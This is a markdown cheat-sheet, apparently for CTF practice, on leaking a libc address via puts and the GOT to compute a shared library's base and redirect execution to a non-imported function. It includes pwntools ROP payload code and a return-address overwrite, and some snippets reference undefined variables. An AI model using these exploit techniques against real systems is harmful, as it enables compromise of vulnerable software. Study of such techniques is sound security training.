# Leak an Address

Use `printf` or `puts` to print out a function address from libc.  
Can then calculate the offset of that function from the base.  
Calculate the offset of a desired function and add that to the libc base,  
you can then call that function directly.  

`readelf -s <libc_path>` will show function offsets.  

## Address Leak to Call a Non-Imported Function

*Setup: a desired function is in a shared library but is not called in the binary.*  
*The binary calls a different function from the shared library*  

Use `readelf` to determine the target functions offset from the library base:  

```bash
readelf -s libpivot32.so
```

Then find the offsets for the target function and the foothold function.  

Use pwntools to load some known addresses:  

```python3
from pwn import *
elf = ELF(".vuln")

foothold_plt = p32(elf.plt.foothold_function)   # Function from the shared library
foothold_got = p32(elf.got.foothold_function)   # Function from the shared library
puts_plt = p32(elf.plt.puts)                    # function we can use to cause a leak
main_ptr = p32(elf.symbols.main)                # needed to rerun the program and maintain address values

foothold_offset = 0x77d
ret2win_offset = 0x974
```

Leak the address:  

```python3
addr_leak = flat([
    foothold_plt,   # Populate the Global Offset Table with addresses. The imported function from the shared library is used.
    puts_plt,       # Use puts to output the address of foothold_function in the Global Offset Table
    main_ptr,       # Run main again so that we can provide a new payload to call the target function
    foothold_got    # Argument for puts, the address to leak
])
io.sendline(addr_leak)
```

Receive the output of `puts` and carve out the address:  

```python3
io.recvuntil(b"whatever\n")   # bytes preceeding the leak
leaked_addresses = io.recv()    # receive data until the next input. Likely to contain more than 1 address -> the first is the one we want
foothold_leak = unpack(leaked_addresses[:4])    # read the first 4 bytes (32bit address. [:8] for 64bit addresses

# 64 bit variation
leak = address[:6]
leak += b"\x00\x00"
print(f"Leaked address: {hex(unpack(leak))}")
```

Calculate the offset to the desired function by first calculating the shared libraries base,  
then adding the offset to the desired function:  

```python3
lib_base = foothold_leak - foothold_offset    # subtracting the offset to foothold_function (found by readelf) from the leaked foothold_function address in the GOT
ret2win_addr = lib_base + ret2win_offset      # adding the libraries base address and the offset to the target function, resulting in the actual address
```

The target functions address can now be placed on the stack, where a return address is overwritten:  

```python3
win = flat([
    b"A" * offset,
    ret2win_addr
])
io.sendline(win)
```
